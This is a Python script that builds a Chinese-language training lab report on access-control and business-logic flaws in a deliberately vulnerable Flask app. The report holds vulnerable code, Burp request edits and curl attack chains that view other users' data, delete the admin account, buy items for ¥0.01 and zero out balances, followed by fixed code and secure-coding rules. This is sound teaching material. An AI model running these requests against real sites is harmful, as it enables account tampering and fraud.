#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
权限提升+业务逻辑漏洞 完整分析报告生成器(v3)
覆盖：水平越权(IDOR)、垂直越权、业务逻辑(价格篡改/负值充值)
"""
import os
from docx import Document
from docx.shared import Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml

doc = Document()

style = doc.styles['Normal']
style.font.name = 'Microsoft YaHei'
style.font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')
for i in range(1,5):
    hs = doc.styles[f'Heading {i}']
    hs.font.name = 'Microsoft YaHei'
    hs.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

def code(doc, text, green=False):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "E8F5E9" if green else "FFEBEE"
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(s)
    r = p.add_run(text)
    r.font.name = 'Courier New'
    r.font.size = Pt(9)
    return p

def box(doc, text, color):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "FFCDD2" if color=="red" else "C8E6C9"
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(s)
    r = p.add_run(text)
    r.bold = True; r.font.size = Pt(11)
    return p

def shade(c, color):
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}" w:val="clear"/>')
    c._tc.get_or_add_tcPr().append(s)

def tbl(doc, data):
    t = doc.add_table(rows=len(data), cols=len(data[0]), style='Light Grid Accent 1')
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, rd in enumerate(data):
        for j, ct in enumerate(rd):
            t.rows[i].cells[j].text = ct
            for p in t.rows[i].cells[j].paragraphs:
                p.alignment = WD_ALIGN_PARAGRAPH.CENTER
                for r in p.runs: r.font.size = Pt(10)
            if i==0:
                shade(t.rows[i].cells[j], "1A237E")
                for p in t.rows[i].cells[j].paragraphs:
                    for r in p.runs: r.font.color.rgb = RGBColor(0xFF,0xFF,0xFF)
    return t

# ===== 封面 =====
for _ in range(4): doc.add_paragraph("")
t = doc.add_paragraph(); t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run("权限提升与业务逻辑漏洞\n分析与修复报告"); r.font.size = Pt(24); r.bold = True
r.font.color.rgb = RGBColor(0x1a,0x1a,0x2e)
doc.add_paragraph("")
s = doc.add_paragraph(); s.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = s.add_run("——越权漏洞·价格篡改·负值充值——"); r.font.size = Pt(14)
r.font.color.rgb = RGBColor(0x45,0x45,0x45)
for _ in range(3): doc.add_paragraph("")
i = doc.add_paragraph(); i.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = i.add_run("实验项目：Web安全漏洞分析与修复\n课程名称：网络安全实训\n报告日期：2026年7月")
r.font.size = Pt(12)
doc.add_page_break()

# ===== 目录 =====
doc.add_heading("目  录", level=1)
chapters = [
    "漏洞概述与风险评级","水平越权漏洞（IDOR）分析与复现","垂直越权漏洞分析与复现",
    "业务逻辑漏洞——商品价格篡改","业务逻辑漏洞——负值充值",
    "Burp Suite实操全流程","修复方案详解","修复前后代码对比","安全编码规范总结"]
for i,ch in enumerate(chapters,1):
    p = doc.add_paragraph(f"第{i}章  {ch}")
    p.paragraph_format.space_after = Pt(6)
    p.runs[0].font.size = Pt(12)
doc.add_page_break()

# ===== 第一章 =====
doc.add_heading("第一章  漏洞概述与风险评级", level=1)
doc.add_paragraph("本次实验在Flask Web应用中发现了三大类安全漏洞，涉及越权访问和业务逻辑缺陷：")

tbl(doc, [("漏洞类型","漏洞名称","严重度","CVSS"),
    ("水平越权","IDOR - 任意用户资料查看","高危","7.5"),
    ("垂直越权","未授权访问管理面板","严重","9.1"),
    ("垂直越权","未授权删除用户","严重","9.6"),
    ("业务逻辑","商品价格由客户端提交","高危","8.2"),
    ("业务逻辑","充值金额未校验正负","高危","8.2")])

doc.add_heading("1.1 漏洞思维导图", level=2)
doc.add_paragraph("""
水平越权(IDOR)：修改URL参数 → 查看他人信息 → 信息泄露
垂直越权：直接访问/admin → 管理面板暴露 → 可删除任意用户
业务逻辑：Burp拦截 → 修改price/amount → 低价购/负值充值
""")

# ===== 第二章 =====
doc.add_heading("第二章  水平越权漏洞（IDOR）分析与复现", level=1)
doc.add_heading("2.1 漏洞原理", level=2)
doc.add_paragraph("Insecure Direct Object Reference（IDOR）是指应用在访问资源时，直接使用用户提供的标识符（如ID），而未验证当前用户是否有权访问该资源。")

doc.add_heading("2.2 漏洞代码", level=2)
code(doc,
    '@app.route("/profile", methods=["GET"])\n'
    'def profile():\n'
    '    user_id = request.args.get("user_id")  # ⚠️ 用户可控\n'
    '    sql = f"SELECT ... FROM users WHERE id = \'{user_id}\'"  # 无session校验\n'
    '    return render_template("profile.html", user=profile_user)')

doc.add_heading("2.3 Burp Suite复现步骤", level=2)
doc.add_paragraph("Step1：登录普通用户alice（alice/alice2025）")
doc.add_paragraph("Step2：Burp拦截/profile?user_id=2的请求，将user_id改为1")
code(doc,
    'GET /profile?user_id=1  ← 把2改成1\n'
    '→ 返回管理员admin的资料（邮箱、手机、余额¥99999）')

doc.add_paragraph("Step3：curl命令验证")
code(doc,"curl -b 'session=...' http://target:5000/profile?user_id=1\n"
         "curl -b 'session=...' http://target:5000/profile?user_id=2\n"
         "curl -b 'session=...' http://target:5000/profile?user_id=3")

doc.add_heading("2.4 攻击效果", level=2)
doc.add_paragraph("任意登录用户可通过修改URL中的user_id参数，查看包括管理员在内的所有用户个人信息（邮箱、手机号、余额），造成大规模信息泄露。")

# ===== 第三章 =====
doc.add_heading("第三章  垂直越权漏洞分析与复现", level=1)
doc.add_heading("3.1 漏洞原理", level=2)
doc.add_paragraph("垂直越权（Privilege Escalation）指低权限用户通过直接访问高权限URL，获得管理员等高级权限的操作能力。")

doc.add_heading("3.2 漏洞点1：未授权访问管理面板", level=2)
code(doc,
    '@app.route("/admin", methods=["GET"])\n'
    'def admin_panel():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n'
    '    # ⚠️ 仅检查了登录，未检查是否为管理员！\n'
    '    users = query_all_users()\n'
    '    return render_template("admin.html", users=users)')

doc.add_paragraph("Burp复现：")
code(doc,
    '# 普通用户alice直接访问\n'
    'GET /admin\n'
    '→ 返回所有用户列表，包含admin/alice等全部信息')

doc.add_heading("3.3 漏洞点2：未授权删除用户", level=2)
code(doc,
    '@app.route("/admin/delete-user", methods=["POST"])\n'
    'def admin_delete_user():\n'
    '    user_id = request.form.get("user_id")\n'
    '    # ⚠️ 任何登录用户都可以删除任意用户！\n'
    '    DELETE FROM users WHERE id = user_id')

doc.add_paragraph("Burp复现：")
code(doc,
    'POST /admin/delete-user\n'
    'Body: user_id=3\n'
    '→ 用户ID=3被永久删除，无需管理员权限')

doc.add_heading("3.4 curl命令验证", level=2)
code(doc,
    "# 模拟普通用户越权访问管理面板\n"
    "curl -c /tmp/cookies.txt -X POST http://target:5000/login \\\n"
    "  -d 'username=alice&password=alice2025'\n"
    "curl -b /tmp/cookies.txt http://target:5000/admin\n"
    "curl -b /tmp/cookies.txt -X POST http://target:5000/admin/delete-user \\\n"
    "  -d 'user_id=1'")

# ===== 第四章 =====
doc.add_heading("第四章  业务逻辑漏洞——商品价格篡改", level=1)
doc.add_heading("4.1 漏洞原理", level=2)
doc.add_paragraph("商品价格应由服务器从数据库获取。若价格由客户端表单提交，攻击者可通过Burp拦截修改price参数，以任意价格购买商品。")

doc.add_heading("4.2 漏洞代码", level=2)
code(doc,
    '@app.route("/cart", methods=["POST"])\n'
    'def cart():\n'
    '    price = request.form.get("price")  # ⚠️ 客户端提交的价格不可信！\n'
    '    total = float(price) * int(quantity)\n'
    '    # 服务器信任了客户端提交的价格，直接使用')

doc.add_heading("4.3 Burp复现步骤", level=2)
doc.add_paragraph("Step1：登录后访问/shop，点击加入购物车（iPhone 15 Pro Max ¥9999）")
doc.add_paragraph("Step2：Burp拦截POST /cart请求")
code(doc,
    'POST /cart HTTP/1.1\n'
    '...\n'
    'product_id=1&product_name=iPhone+15+Pro+Max&price=9999&quantity=1\n'
    '                              ⚠️ 把price=9999 改成 price=0.01\n'
    '→ 以￥0.01成功将iPhone加入购物车！')

doc.add_heading("4.4 curl命令验证", level=2)
code(doc,
    "curl -b cookies.txt -X POST http://target:5000/cart \\\n"
    "  -d 'product_id=1&product_name=iPhone&price=0.01&quantity=1'\n"
    "# 返回总价 ¥0.01，原价¥9999的商品用1分钱买到")

# ===== 第五章 =====
doc.add_heading("第五章  业务逻辑漏洞——负值充值", level=1)
doc.add_heading("5.1 漏洞原理", level=2)
doc.add_paragraph("充值功能直接执行 balance = balance + amount，但未校验amount的正负。攻击者可提交负值来扣减任意用户的余额。")

doc.add_heading("5.2 漏洞代码", level=2)
code(doc,'sql = f"UPDATE users SET balance = balance + {amount} ..."  # ⚠️ amount可为负数')

doc.add_heading("5.3 Burp复现", level=2)
code(doc,
    'POST /recharge HTTP/1.1\n'
    'Body: user_id=2&amount=-100\n'
    '→ alice的余额从¥100变成¥0\n\n'
    'POST /recharge HTTP/1.1\n'
    'Body: user_id=1&amount=-99999\n'
    '→ admin的余额从¥99999变成¥0')

# ===== 第六章 =====
doc.add_heading("第六章  Burp Suite实操全流程", level=1)
doc.add_heading("6.1 环境搭建", level=2)
code(doc,"git clone https://github.com/Zhang123456-rgb/2025141530175\n"
         "cd 2025141530175 && pip install flask && python app.py")

doc.add_heading("6.2 Burp配置", level=2)
doc.add_paragraph("1. 打开Burp Suite → Proxy → Proxy Settings")
doc.add_paragraph("2. 添加监听地址 127.0.0.1:8080")
doc.add_paragraph("3. 浏览器设置代理为 127.0.0.1:8080")
doc.add_paragraph("4. 打开Intercept（拦截开关）")

doc.add_heading("6.3 攻击流程汇总", level=2)
tbl(doc, [("#","攻击类型","Burp操作","攻击效果"),
    ("1","水平越权","拦截/profile请求，改user_id参数","查看任意用户信息"),
    ("2","垂直越权1","直接访问/admin","进入管理面板(无需管理员)"),
    ("3","垂直越权2","拦截/admin/delete-user","删除任意用户"),
    ("4","价格篡改","拦截/cart请求，改price=0.01","1分钱买iPhone"),
    ("5","负值充值","拦截/recharge请求，改amount=-99999","清空他人余额")])

doc.add_paragraph("")
doc.add_heading("6.4 完整攻击链示例", level=2)
code(doc,
    "# 1. 登录alice\n"
    "curl -c /tmp/c.txt -X POST http://target:5000/login \\\n"
    "  -d 'username=alice&password=alice2025'\n\n"
    "# 2. 水平越权：查看admin资料\n"
    "curl -b /tmp/c.txt 'http://target:5000/profile?user_id=1'\n\n"
    "# 3. 垂直越权：删除admin用户\n"
    "curl -b /tmp/c.txt -X POST http://target:5000/admin/delete-user \\\n"
    "  -d 'user_id=1'\n\n"
    "# 4. 价格篡改：1分钱买iPhone\n"
    "curl -b /tmp/c.txt -X POST http://target:5000/cart \\\n"
    "  -d 'product_id=1&product_name=iPhone&price=0.01&quantity=1'\n\n"
    "# 5. 负值充值：扣减他人余额\n"
    "curl -b /tmp/c.txt -X POST http://target:5000/recharge \\\n"
    "  -d 'user_id=2&amount=-100'")

# ===== 第七章 =====
doc.add_heading("第七章  修复方案详解", level=1)

doc.add_heading("7.1 IDOR修复——验证资源所有权", level=2)
box(doc, "✅ 修复：从session获取当前用户，与请求的资源所有者比对", "green")
code(doc,
    '@app.route("/profile", methods=["GET"])\n'
    'def profile():\n'
    '    user_id = request.args.get("user_id")\n'
    '    # 获取当前用户\n'
    '    c.execute("SELECT username,role FROM users WHERE id=?", (user_id,))\n'
    '    target = c.fetchone()\n'
    '    if role != "admin" and target["username"] != session["username"]:\n'
    '        return "权限不足"\n'
    '    # 仅管理员可查看他人，普通用户只看自己', green=True)

doc.add_heading("7.2 垂直越权修复——角色校验", level=2)
box(doc, "✅ 修复：每个管理功能前检查当前用户的role是否为admin", "green")
code(doc,
    '@app.route("/admin", methods=["GET"])\n'
    'def admin():\n'
    '    username = session.get("username")\n'
    '    c.execute("SELECT role FROM users WHERE username=?", (username,))\n'
    '    if c.fetchone()["role"] != "admin":\n'
    '        return "权限不足，仅管理员可访问"', green=True)

doc.add_heading("7.3 价格篡改修复——服务端定价", level=2)
box(doc, "✅ 修复：价格从数据库获取，不信任客户端提交的值", "green")
code(doc,
    '@app.route("/cart", methods=["POST"])\n'
    'def cart():\n'
    '    # 价格从数据库查询，拒绝客户端提交的价格\n'
    '    c.execute("SELECT price FROM products WHERE id=?", (product_id,))\n'
    '    real_price = c.fetchone()["price"]\n'
    '    total = real_price * int(quantity)  # 使用真实价格', green=True)

doc.add_heading("7.4 负值充值修复——金额正校验", level=2)
box(doc, "✅ 修复：校验amount必须为正数；验证用户只能给自己充值", "green")
code(doc,
    '@app.route("/recharge", methods=["POST"])\n'
    'def recharge():\n'
    '    amount = float(request.form.get("amount"))\n'
    '    if amount <= 0:\n'
    '        return "充值金额必须为正数"\n'
    '    c.execute("UPDATE users SET balance=balance+? WHERE id=?",\n'
    '             (amount, user_id))', green=True)

doc.add_heading("7.5 最小权限原则实现", level=2)
doc.add_paragraph("修复的核心是遵循最小权限原则：")
doc.add_paragraph("服务器不能信任任何客户端提交的权限相关数据", style='List Bullet')
doc.add_paragraph("每个敏感操作都必须二次校验身份和权限", style='List Bullet')
doc.add_paragraph("资源标识符必须结合session验证所有权", style='List Bullet')
doc.add_paragraph("关键数据（价格、金额）仅从服务端可信源获取", style='List Bullet')
doc.add_paragraph("所有越权行为记录审计日志", style='List Bullet')

# ===== 第八章 =====
doc.add_heading("第八章  修复前后代码对比", level=1)
tbl(doc, [("漏洞","有漏洞(app.py)","已修复(app_fixed.py)"),
    ("水平越权","user_id来自URL，无所有权校验","校验当前用户是否为目标用户本人或admin"),
    ("垂直越权(admin)","仅检查登录，未检查role","检查session用户的role==admin"),
    ("垂直越权(delete)","无任何权限检查","检查role==admin，记录审计日志"),
    ("价格篡改","price来自表单提交","price从数据库products表查询"),
    ("负值充值","amount未校验正负","amount<=0时拒绝，限制只能给自己充值")])

doc.add_paragraph("")
doc.add_heading("核心修复逻辑对比", level=2)
p = doc.add_paragraph(); r = p.add_run("有漏洞版本："); r.bold = True; r.font.color.rgb = RGBColor(0xD3,0x2F,0x2F)
code(doc,
    '# 信任一切客户端输入\n'
    'user_id = request.args.get("user_id")    # 未校验所有权\n'
    'price = request.form.get("price")        # 未从数据库获取\n'
    'amount = request.form.get("amount")      # 未校验正负')

p = doc.add_paragraph(); r = p.add_run("修复版本："); r.bold = True; r.font.color.rgb = RGBColor(0x2E,0x7D,0x32)
code(doc,
    '# 服务器端全覆盖校验\n'
    'if cur_user["role"] != "admin" and target != session["username"]: return "权限不足"\n'
    'real_price = c.fetchone()["price"]           # 从数据库取真实价格\n'
    'if amount <= 0: return "金额必须为正数"       # 校验金额正负', green=True)

# ===== 第九章 =====
doc.add_heading("第九章  安全编码规范总结", level=1)
principles = [
    ("原则一：永不信任客户端","用户ID、价格、金额等关键数据必须来自服务端可信源（数据库/session），不能依赖客户端提交。"),
    ("原则二：二次权限校验","每个管理功能、每个敏感操作都必须校验当前用户是否有权执行。仅检查登录不够，必须检查角色。"),
    ("原则三：资源所有权验证","用户只能访问属于自己的资源。URL参数中的ID必须与当前用户session比对。"),
    ("原则四：业务逻辑边界校验","金额必须为正数、库存不能为负、折扣不能超过100%。业务逻辑的边界条件必须服务端校验。"),
    ("原则五：最小权限","用户只应有完成任务所需的最小权限。管理功能默认不开放，通过role显式授权。"),
    ("原则六：审计日志","所有越权尝试、敏感操作必须记录日志，包括用户、时间、IP、操作内容，支持安全溯源。")]
for t,d in principles:
    doc.add_heading(t, level=2)
    doc.add_paragraph(d)

doc.add_paragraph("")
p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("—— 报告结束 ——"); r.font.color.rgb = RGBColor(0x99,0x99,0x99); r.font.size = Pt(12)

out = "/root/flask-app-vuln/static/权限提升与业务逻辑漏洞分析报告.docx"
doc.save(out)
print(f"✅ Word报告已生成：{out}")
print(f"   文件大小：{os.path.getsize(out)/1024:.1f}KB")
